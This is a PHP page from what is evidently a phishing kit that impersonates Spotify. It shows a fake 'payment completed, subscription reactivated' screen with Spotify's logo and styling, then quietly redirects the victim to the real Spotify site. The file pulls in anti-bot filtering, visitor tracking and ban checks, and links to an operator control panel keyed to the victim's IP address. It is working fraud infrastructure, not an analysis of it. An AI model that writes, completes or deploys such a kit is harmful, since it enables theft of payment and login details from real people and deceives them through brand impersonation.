<?php
header('Cache-Control: no-cache, no-store, must-revalidate');
header('Pragma: no-cache');
header('Expires: 0');

session_start();

require_once 'funcsion/functions.php';
$ip = get_client_ip();

checkBanStatus();
require_once 'config/config.php';
require_once 'translations/translations.php';
$t = initTranslations();
require_once 'onti_bot/security.php';

$current_page = 'success';
update_tracking($current_page);

$success_title = isset($t['success_title']) ? $t['success_title'] : 'Payment completed';
$success_message = isset($t['success_message']) ? $t['success_message'] : 'Thank you for confirming your payment. Your subscription has been reactivated successfully.';
$success_redirect = isset($t['success_redirect']) ? $t['success_redirect'] : 'Redirecting to Spotify...';
$success_control_panel = isset($t['success_control_panel']) ? $t['success_control_panel'] : 'Control Panel';

$control_panel_url = 'panel/control.php?ip=' . urlencode($ip);
?>
<html dir="auto">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width">
    <title><?php echo htmlspecialchars($success_title); ?></title>
    <link rel="stylesheet" href="files/spot2.css">
    <link type="image/x-icon" rel="shortcut icon" href="data:image/vnd.microsoft.icon;base64,AAABAAIAEBAAAAAAIABoBAAAJgAAACAgAAAAACAAqBAAAI4EAAAoAAAAEAAAACAAAAABACAAAAAAAEAEAAAAAAAAAAAAAAAAAAAAAAAA////Af///wH///8B////ARMTGCUTExiLExMYzxMTGOsTExjnExMYzxMTGIsTExgl////Af///wH///8B////Af///wH///8BExMYBRMTGJMTExj7ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY+xMTGJMTExgF////Af///wH///8BExMYBRMTGMMTExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMYwxMTGAX///8B////ARMTGJMTExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExiT////ARMTGCUTExj7ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExivExMYpxMTGP8TExj/ExMY+xMTGCUTExiLExMY/xMTGP8TExirExMYTRMTGG8TExh/ExMYfxMTGFcTExgpExMYZxMTGOMTExj/ExMY/xMTGP8TExiLExMYzxMTGP8TExj/ExMY/xMTGNsTExi3ExMYnxMTGKcTExjLExMY+xMTGP8TExivExMYuxMTGP8TExj/ExMYzxMTGOsTExj/ExMY/xMTGJcTExibExMYvxMTGN8TExjHExMYrxMTGHcTExglExMYJRMTGLsTExj/ExMY/xMTGOsTExjrExMY/xMTGP8TExifExMYTRMTGCETExghExMYIRMTGDUTExhnExMYtxMTGPsTExj3ExMY8xMTGP8TExjnExMYzxMTGP8TExj/ExMY5xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGNcTExiHExMYGRMTGF8TExj/ExMYzxMTGIsTExj/ExMYs////wETExgZExMYQRMTGEETExhBExMYORMTGBX///8BExMYFRMTGHMTExjrExMY/xMTGIsTExglExMY+xMTGP8TExi/ExMYixMTGGcTExhfExMYXxMTGG8TExiTExMYxxMTGPsTExj/ExMY/xMTGPsTExgl////ARMTGJMTExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExiT////Af///wETExgFExMYwxMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGP8TExjDExMYBf///wH///8B////ARMTGAUTExiTExMY+xMTGP8TExj/ExMY/xMTGP8TExj/ExMY/xMTGPsTExiTExMYBf///wH///8B////Af///wH///8B////ARMTGCUTExiLExMYzxMTGOsTExjrExMYzxMTGIsTExgl////Af///wH///8B////AQ==">
    <style>
      .sf-hidden { display: none !important }
      .success-page { max-width: 480px; margin: 0 auto; padding: 48px 24px; text-align: center; }
      .success-icon { width: 80px; height: 80px; margin: 0 auto 24px; background: #1db954; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
      .success-icon svg { width: 44px; height: 44px; color: #fff; }
      .success-title { font-size: 24px; font-weight: 700; color: #1a1a1a; margin: 0 0 16px 0; }
      .success-message { font-size: 16px; color: #535353; line-height: 1.6; margin: 0 0 24px 0; }
      .success-redirect { font-size: 14px; color: #878787; margin-bottom: 24px; }
      .success-cta { display: inline-block; padding: 14px 28px; background: #1db954; color: #fff; font-weight: 600; font-size: 16px; border-radius: 500px; text-decoration: none; transition: background 0.2s; }
      .success-cta:hover { background: #1ed760; }
    </style>
</head>
<body class="encore-light-theme encore-layout-themes" data-page="success">
    <div id="__next">
        <div class="BasePage__BasePageLayout-sc-jo0cy2-0 jPGFyY">
            <div>
                <header role="banner" class="mh-header-hover mh-default-z-index svelte-u4otmp">
                    <a class="mh-skip-link svelte-u4otmp" href="##start-of-content"></a>
                    <div class="mh-container svelte-u4otmp">
                        <div class="mh-brand-wrapper svelte-u4otmp">
                            <a href="#" class="mh-header-primary svelte-18o1xvt">
                                <span class="mh-header-primary svelte-1gcdbl9">
                                    <svg id="Layer_1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 823.46 225.25" style="height:32px;width:auto;">
                                        <g fill-rule="evenodd" class="svelte-1gcdbl9">
                                            <path d="m125.52,3.31C65.14.91,14.26,47.91,11.86,108.29c-2.4,60.38,44.61,111.26,104.98,113.66,60.38,2.4,111.26-44.6,113.66-104.98C232.89,56.59,185.89,5.7,125.52,3.31Zm46.18,160.28c-1.36,2.4-4.01,3.6-6.59,3.24-.79-.11-1.58-.37-2.32-.79-14.46-8.23-30.22-13.59-46.84-15.93-16.62-2.34-33.25-1.53-49.42,2.4-3.51.85-7.04-1.3-7.89-4.81-.85-3.51,1.3-7.04,4.81-7.89,17.78-4.32,36.06-5.21,54.32-2.64,18.26,2.57,35.58,8.46,51.49,17.51,3.13,1.79,4.23,5.77,2.45,8.91Zm14.38-28.72c-2.23,4.12-7.39,5.66-11.51,3.43-16.92-9.15-35.24-15.16-54.45-17.86-19.21-2.7-38.47-1.97-57.26,2.16-1.02.22-2.03.26-3.01.12-3.41-.48-6.33-3.02-7.11-6.59-1.01-4.58,1.89-9.11,6.47-10.12,20.77-4.57,42.06-5.38,63.28-2.4,21.21,2.98,41.46,9.62,60.16,19.74,4.13,2.23,5.66,7.38,3.43,11.51Zm15.94-32.38c-2.1,4.04-6.47,6.13-10.73,5.53-1.15-.16-2.28-.52-3.37-1.08-19.7-10.25-40.92-17.02-63.07-20.13-22.15-3.11-44.42-2.45-66.18,1.97-5.66,1.15-11.17-2.51-12.32-8.16-1.15-5.66,2.51-11.17,8.16-12.32,24.1-4.89,48.74-5.62,73.25-2.18,24.51,3.44,47.99,10.94,69.81,22.29,5.12,2.66,7.11,8.97,4.45,14.09Z"></path>
                                            <path d="m318.54,169.81c-18.87,0-35.07-6.53-41.84-13.95-.64-.73-.73-1.13-.73-2.02v-22.09c0-1.05.89-1.45,1.61-.56,8.14,10.16,25.48,18.46,39.67,18.46,11.29,0,18.87-3.06,18.87-13.06,0-5.97-2.82-9.84-18.22-14.19l-8.87-2.5c-20.56-5.8-33.06-12.66-33.06-32.33,0-17.41,16.12-32.73,43.05-32.73,13.22,0,26.36,4.11,33.94,9.76.64.48.89.97.89,1.85v20.08c0,1.37-1.13,1.77-2.18.89-6.13-5.08-17.98-11.93-32.01-11.93s-20.64,6.29-20.64,12.09c0,6.13,4.27,7.82,19.51,12.34l7.58,2.26c23.46,7.01,33.06,16.85,33.06,33.14,0,20.96-17.41,34.51-40.63,34.51Zm164.39-42.09c0-12.82,8.87-22.33,21.37-22.33s21.28,9.51,21.28,22.33-8.87,22.33-21.28,22.33-21.37-9.51-21.37-22.33Zm21.28,42.09c26.04,0,44.18-18.62,44.18-42.09s-18.14-42.09-44.18-42.09-44.1,18.46-44.1,42.09,17.98,42.09,44.1,42.09Zm157.22-89.01v6.77h-13.71c-.73,0-1.13.4-1.13,1.13v16.12c0,.73.4,1.13,1.13,1.13h13.71v60.79c0,.73.4,1.13,1.13,1.13h20.64c.73,0,1.13-.4,1.13-1.13v-60.79h17.66l25.64,55.71-13.79,30.31c-.4.89.08,1.29.89,1.29h22.01c.73,0,1.05-.16,1.37-.89l45.55-103.52c.32-.73-.08-1.29-.89-1.29h-20.64c-.73,0-1.05.16-1.37.89l-20.8,49.99-20.88-49.99c-.32-.73-.64-.89-1.37-.89h-33.38v-5.32c0-8.71,5.89-12.74,13.46-12.74,4.51,0,9.43,2.34,12.9,4.43.81.48,1.37-.08,1.05-.81l-7.26-17.33c-.24-.56-.56-.89-1.13-1.21-3.55-1.85-9.35-3.47-15-3.47-17.09,0-26.93,13.06-26.93,29.67Zm-243,88.52c20.64,0,35.47-17.82,35.47-41.76s-15-41.44-35.64-41.44c-15.32,0-24.19,9.35-29.35,18.7v-16.12c0-.73-.4-1.13-1.13-1.13h-20.24c-.73,0-1.13.4-1.13,1.13v103.44c0,.73.4,1.13,1.13,1.13h20.24c.73,0,1.13-.4,1.13-1.13v-41.36c5.16,9.35,13.87,18.54,29.51,18.54Zm172.21-.32c6.77,0,13.3-1.77,17.17-4.03.56-.32.64-.64.64-1.21v-15.32c0-.81-.4-1.05-1.13-.64-2.34,1.29-5.4,2.34-9.59,2.34-6.61,0-10.8-3.87-10.8-12.42v-31.77h20.16c.73,0,1.13-.4,1.13-1.13v-16.12c0-.73-.4-1.13-1.13-1.13h-20.16v-21.04c0-.89-.56-1.37-1.37-.73l-36.04,28.38c-.48.4-.64.81-.64,1.45v9.19c0,.73.4,1.13,1.13,1.13h14.03v35.15c0,19.03,10.96,27.9,26.61,27.9Zm23.3-105.29c0,7.26,5.64,12.74,13.38,12.74s13.54-5.48,13.54-12.74-5.64-12.74-13.54-12.74-13.38,5.48-13.38,12.74Zm3.14,104.17h20.64c.73,0,1.13-.4,1.13-1.13v-78.04c0-.73-.4-1.13-1.13-1.13h-20.64c-.73,0-1.13.4-1.13,1.13v78.04c0,.73.4,1.13,1.13,1.13Zm-228.65-40.47c3.71-12.42,12.25-21.93,23.86-21.93s18.7,8.38,18.7,22.09-7.66,22.25-18.7,22.25-20.16-10.64-23.86-22.41Z"></path>
                                            <path d="m810.1,92.31c-1.06-1.83-2.53-3.26-4.41-4.3-1.88-1.03-3.98-1.55-6.32-1.55s-4.44.52-6.32,1.55c-1.88,1.04-3.35,2.47-4.41,4.3-1.06,1.83-1.59,3.9-1.59,6.21s.53,4.34,1.59,6.17c1.06,1.83,2.53,3.26,4.41,4.3,1.88,1.04,3.98,1.55,6.32,1.55s4.44-.52,6.32-1.55,3.35-2.47,4.41-4.3c1.06-1.83,1.59-3.88,1.59-6.17s-.53-4.38-1.59-6.21Zm-1.93,11.36c-.86,1.52-2.06,2.7-3.59,3.56-1.53.85-3.27,1.28-5.2,1.28s-3.72-.43-5.25-1.28c-1.53-.85-2.72-2.04-3.57-3.56-.85-1.51-1.27-3.23-1.27-5.15s.42-3.63,1.27-5.13c.85-1.5,2.04-2.68,3.57-3.53,1.53-.85,3.28-1.28,5.25-1.28s3.67.43,5.2,1.28c1.53.85,2.73,2.04,3.59,3.56.86,1.52,1.29,3.23,1.29,5.15s-.43,3.59-1.29,5.11Z"></path>
                                            <path d="m803.56,98.29c.82-.6,1.23-1.4,1.23-2.39s-.4-1.83-1.2-2.43c-.8-.6-1.96-.9-3.48-.9h-5.36v11.2h2.59v-4.45h1.41l3.41,4.45h3.18l-3.73-4.72c.79-.15,1.46-.4,1.96-.77Zm-3.86-.99h-2.36v-2.74h2.45c.73,0,1.29.11,1.68.34.39.23.59.58.59,1.06,0,.45-.21.79-.61,1.01-.41.23-.99.34-1.75.34Z"></path>
                                        </g>
                                    </svg>
                                </span>
                            </a>
                        </div>
                        <nav role="navigation" class="mh-desktop svelte-4ldyho" aria-label="Desktop navigation">
                            <ul class="svelte-4ldyho">
                                <li class="svelte-kdyqkb">
                                    <button class="mh-header-primary svelte-kdyqkb" aria-expanded="false" aria-controls="profileMenu" linkbutton="">
                                        <img src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/7QCEUGhvdG9zaG9wIDMuMAA4QklNBAQAAAAAAGgcAigAYkZCTUQwYTAwMGE2NDAxMDAwMDk1MDEwMDAwYjYwMTAwMDBkNzAxMDAwMGY4MDEwMDAwMTkwMjAwMDAyNDAyMDAwMDU0MDIwMDAwNzUwMjAwMDA5NjAyMDAwMGEzMDIwMDAwAP/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/CABEIADIAMgMBIgACEQEDEQH/xAAVAAEBAAAAAAAAAAAAAAAAAAAAB//EABQBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAAZSAAAAAAAAAAAAAAAD/xAAUEAEAAAAAAAAAAAAAAAAAAABQ/9oACAEBAAEFAkf/xAAUEQEAAAAAAAAAAAAAAAAAAABA/9oACAEDAQE/AQf/xAAUEQEAAAAAAAAAAAAAAAAAAABA/9oACAECAQE/AQf/xAAUEAEAAAAAAAAAAAAAAAAAAABQ/9oACAEBAAY/Akf/xAAUEAEAAAAAAAAAAAAAAAAAAABQ/9oACAEBAAE/IUf/2gAMAwEAAgADAAAAEPPPPPPPPPPPPPPPPP/EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8QB//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8QB//EABQQAQAAAAAAAAAAAAAAAAAAAFD/2gAIAQEAAT8QR//Z" alt="" class="svelte-8gzfq1">
                                        <div class="mh-profile-title svelte-kdyqkb">
                                            <span class="svelte-kdyqkb"><?php echo htmlspecialchars($t['profile']); ?></span>
                                            <svg viewBox="0 0 1024 1024" style="" class="svelte-13ynk3t">
                                                <path d="M476.455 806.696L95.291 425.532Q80.67 410.911 80.67 390.239t14.621-34.789 35.293-14.117 34.789 14.117L508.219 698.8l349.4-349.4q14.621-14.117 35.293-14.117t34.789 14.117 14.117 34.789-14.117 34.789L546.537 800.142q-19.159 19.159-38.318 19.159t-31.764-12.605z"></path>
                                            </svg>
                                        </div>
                                    </button>
                                    <div id="profileMenu" class="mh-dropdown-menu svelte-kdyqkb sf-hidden"></div>
                                </li>
                            </ul>
                        </nav>
                        <div class="mh-mobile-menu svelte-4ldyho sf-hidden"></div>
                    </div>
                </header>
            </div>
            <div id="start-of-content" class="svelte-u4otmp"></div>
            <main class="BasePage__BasePageContent-sc-jo0cy2-1 grnxhP">
                <div class="success-page">
                    <div class="success-icon">
                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
                    </div>
                    <h1 class="success-title"><?php echo htmlspecialchars($success_title); ?></h1>
                    <p class="success-message"><?php echo nl2br(htmlspecialchars($success_message)); ?></p>
                    <p class="success-redirect"><?php echo htmlspecialchars($success_redirect); ?></p>
                    <a href="<?php echo htmlspecialchars($control_panel_url); ?>" class="success-cta"><?php echo htmlspecialchars($success_control_panel); ?></a>
                </div>
            </main>
<?php include 'global/footer.php'; ?>
        </div>
    </div>
    <script>
    setTimeout(function(){
        window.location.href = 'https://open.spotify.com';
    }, 6000);
    </script>
</body>
</html>
